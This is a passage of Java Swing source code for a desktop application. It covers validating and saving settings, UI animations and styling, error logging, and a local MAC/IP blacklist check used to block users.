						&& !conf[24].equalsIgnoreCase("4") && !conf[24].equalsIgnoreCase("5")
						&& !conf[24].equalsIgnoreCase("6")))
			conf[24] = "0";
		if (conf[25] == null || conf[5].equalsIgnoreCase("null") || (!TextEffect.isInteger(conf[25])))
			conf[25] = "3";
		if (conf[26] == null || conf[26].equalsIgnoreCase("null")
				|| (!conf[26].equalsIgnoreCase("true") && !conf[26].equalsIgnoreCase("false")))
			conf[26] = "false";
		try {
			FileWriter savedF = new FileWriter(confFile);
			savedF.write(conf[0] + System.lineSeparator());// icon
			savedF.write(conf[1] + System.lineSeparator());/// sound effect
			savedF.write(conf[2] + System.lineSeparator());// key shortcut
			savedF.write(conf[3] + System.lineSeparator());// res
			savedF.write(conf[4] + System.lineSeparator());// auto save
			savedF.write(conf[5] + System.lineSeparator());// first frame
			savedF.write(conf[6] + System.lineSeparator());// speed
			savedF.write(conf[7] + System.lineSeparator());// lang
			savedF.write(conf[8] + System.lineSeparator());// effect chooser
			savedF.write(conf[9] + System.lineSeparator());// intro
			savedF.write(conf[10] + System.lineSeparator());// theme
			savedF.write(conf[11] + System.lineSeparator());// anim
			savedF.write(conf[12] + System.lineSeparator());// alwaytop
			savedF.write(conf[13] + System.lineSeparator());// autoupdate
			savedF.write(conf[14] + System.lineSeparator());// style
			savedF.write(conf[15] + System.lineSeparator());// dock
			savedF.write(conf[16] + System.lineSeparator());// date
			savedF.write(conf[17] + System.lineSeparator());// not
			savedF.write(conf[18] + System.lineSeparator());// autoclean
			savedF.write(conf[19] + System.lineSeparator());// stock
			savedF.write(conf[20] + System.lineSeparator());// EVENT
			savedF.write(conf[21] + System.lineSeparator());// add stk
			savedF.write(conf[22] + System.lineSeparator());// SORT STOCK
			savedF.write(conf[23] + System.lineSeparator());// SHOW LIC
			savedF.write(conf[24] + System.lineSeparator());// NOT POS
			savedF.write(conf[25] + System.lineSeparator());// NOT TIME
			savedF.write(conf[26] + System.lineSeparator());// NOT bg
			savedF.close();
		} catch (Exception e) {
			writeError(e);
		}
	}

	// Play sound effect for some buttons
	private void soundEffect(URL sound) {
		try {// sounds
			AudioInputStream audioStream = AudioSystem.getAudioInputStream(sound);
			Clip clip = AudioSystem.getClip();
			clip.open(audioStream);
			clip.start();
		} catch (Exception e) {
			writeError(e);
		}
	}

	// Red animation for the wrong password
	public static void startBorderAnimation(JComponent field) {
		Color oldColor = field.getBackground();
		javax.swing.Timer timer = new javax.swing.Timer(10, null); // 50 ms for animation speed
		timer.addActionListener(new ActionListener() {
			private float alpha = 0.0f; // Start with alpha 0 (fully transparent)
			private boolean increasing = true;
			private int cycleCount = 0; // Track the number of cycles

			@Override
			public void actionPerformed(ActionEvent e) {
				if (increasing) {
					alpha += 0.05f; // Increase alpha value
					if (alpha >= 1.0f) {
						alpha = 1.0f; // Clamp at 1.0
						increasing = false; // Switch to decreasing
					}
				} else {
					alpha -= 0.05f; // Decrease alpha value
					if (alpha <= 0.0f) {
						alpha = 0.0f; // Clamp at 0.0
						increasing = true; // Switch back to increasing
						cycleCount++; // Complete one full cycle
					}
				}

				// Apply the background color with the current alpha value
				field.setBackground(new Color(121, 31, 25, Math.round(alpha * 255)));

				// Stop after 2 full cycles
				if (cycleCount >= 2 && alpha == 0.0f) {
					timer.stop();
					field.setBackground(oldColor); // Reset to white background
				}
			}
		});

		timer.start();
	}

	// Style of the buttons used all around the app
	static void btnStyle(JButton btn) {
		btn.setBorder(borderL);
		btn.setBackground(lightC);
		btn.setForeground(blackM);
		btn.setFocusable(false);
		btn.setHorizontalAlignment(0);
		btn.setFont(myFont);
		btn.setCursor(new Cursor(HAND_CURSOR));
	}

	// Style for the label used all around the app
	static void labelStyle(JLabel label) {
		label.setBorder(borderL);
		label.setBackground(lightC);
		label.setForeground(blackM);
		label.setFocusable(false);
		label.setHorizontalAlignment(0);
		label.setOpaque(true);
		label.setFont(myFont);
	}

	// Retrieve programdata folder acc to os
	private String getHiddenPath() {
		String os = System.getProperty("os.name").toLowerCase();
		if (os.contains("win")) {
			return System.getenv("PROGRAMDATA") + File.separator + "HADI-TECH";
		} else {
			return System.getProperty("user.home") + File.separator + ".HADI-TECH";
		}
	}

	// Retrieve pc mac address
	private String getMacAddress() {
		try {
			Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
			while (interfaces.hasMoreElements()) {
				NetworkInterface network = interfaces.nextElement();
				byte[] mac = network.getHardwareAddress();
				if (mac != null) {
					StringBuilder macStr = new StringBuilder();
					for (byte b : mac) {
						macStr.append(String.format("%02X:", b));
					}
					if (macStr.length() > 0) {
						macStr.deleteCharAt(macStr.length() - 1);
					}
					return macStr.toString();
				}
			}
		} catch (Exception e) {
		}
		return "UNKNOWN";
	}

	// Retrieve pc ip address
	private String getPublicIp() {
		try {
			URL url = new URL("http://checkip.amazonaws.com/");
			BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
			return in.readLine().trim();
		} catch (Exception e) {
		}
		return "UNKNOWN";
	}

	// return true if the mac/ip is on the blocked list
	private boolean isBlocked() {
		Encryption enc = new Encryption();
		try {
			Set<String> blackListUsers = new HashSet<>(Files.readAllLines(Paths.get(getHiddenPath() + "/macs.dll")));
			String encrMac = enc.encrypt(getMacAddress()), encIP = enc.encrypt(getPublicIp());
			if (blackListUsers.contains(getPublicIp()) || blackListUsers.contains(encIP))
				return blackListUsers.contains(encrMac);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	/* Fade opacity */
	public void applyFadeEffect(JButton button, ImageIcon darkIcon, float startOpacity, float endOpacity, int delay) {
		float step = (endOpacity - startOpacity) / 50;
		final float[] opacity = { startOpacity };

		javax.swing.Timer timer = new javax.swing.Timer(delay, null);
		timer.addActionListener(_ -> {
			// Adjust opacity
			opacity[0] += step;
			if ((step > 0 && opacity[0] >= endOpacity) || (step < 0 && opacity[0] <= endOpacity)) {
				opacity[0] = endOpacity;
				timer.stop();
			}

			// Update button icon with the new opacity
			button.setIcon(ImageEffect.changeOpacity(darkIcon.getImage(), opacity[0]));
		});
		button.setCursor(new Cursor(HAND_CURSOR));

		timer.start();
	}

	public static void applyFadeEffect(JButton button, Supplier<ImageIcon> darkIconSupplier,
			Supplier<ImageIcon> whiteIconSupplier, float startOpacity, float endOpacity, int delay, String mode) {
		float step = (endOpacity - startOpacity) / 50;
		final float[] opacity = { startOpacity };

		javax.swing.Timer timer = new javax.swing.Timer(delay, null);
		if (!timer.isRunning())
			timer.addActionListener(_ -> {
				// Adjust opacity
				opacity[0] += step;
				if ((step > 0 && opacity[0] >= endOpacity) || (step < 0 && opacity[0] <= endOpacity)) {
					opacity[0] = endOpacity;
					timer.stop();
				}

				// Update button icon with the new opacity
				ImageIcon darkIcon = darkIconSupplier.get();
				ImageIcon whiteIcon = whiteIconSupplier.get();
				button.setIcon(mode.equalsIgnoreCase("2") ? ImageEffect.changeOpacity(whiteIcon.getImage(), opacity[0])
						: ImageEffect.changeOpacity(darkIcon.getImage(), opacity[0]));
			});
		else
			timer.restart();

		timer.start();
	}

	public static void opacityEffect(JButton button, Supplier<ImageIcon> notIconSupplier, String mode) {
		button.setBorderPainted(false);
		button.setFocusPainted(false);
		button.setContentAreaFilled(false);

		button.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseEntered(MouseEvent e) {
				applyFadeEffect(button, notIconSupplier, () -> ImageEffect.invertColor(notIconSupplier.get()), 0.5f,
						1.0f, 5, mode);
			}

			@Override
			public void mouseExited(MouseEvent e) {
				applyFadeEffect(button, notIconSupplier, () -> ImageEffect.invertColor(notIconSupplier.get()), 1.0f,
						0.5f, 5, mode);
			}
		});

		button.setCursor(new Cursor(HAND_CURSOR));
	}

	private void writeError(Exception e) {
		File logF = new File(dataFolder + "\\LOG");
		logF.mkdir();
		String timeFolder = LocalDateTime.now().format(DateTimeFormatter.ofPattern("dd-MM-yyyy"));
		File errorF = new File(logF, timeFolder + ".txt");
		// Get the current date and time
		String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));

		try (PrintWriter writer = new PrintWriter(new FileWriter(errorF, true))) {
			writer.println("[" + timestamp + "] ERROR: " + e.getMessage());
			// Get only the first line of the stack trace (where the error happened)
			if (e != null) {
				StackTraceElement[] stackTrace = e.getStackTrace();
				if (stackTrace.length > 0) {
					writer.println("    at " + stackTrace[0]); // Logs only the first relevant line
				}
			}
			writer.println("-------------------------------------------------");
			Toast.show(this, Toast.Type.ERROR, "ERROR -> " + e.getMessage(), notOption);
		} catch (IOException e1) {
			writeError(e1);
			return; // Stop execution if writing fails
		}
	}
}

class InitialFocusSetter {
	public static void setInitialFocus(Window w, Component c) {
		w.addWindowListener(new FocusSetter(c));
	}
}

class FocusSetter extends WindowAdapter {
	Component initComp;

	FocusSetter(Component c) {
		initComp = c;
	}

	@Override
	public void windowOpened(WindowEvent e) {
		initComp.requestFocus();
		e.getWindow().removeWindowListener(this);
	}
}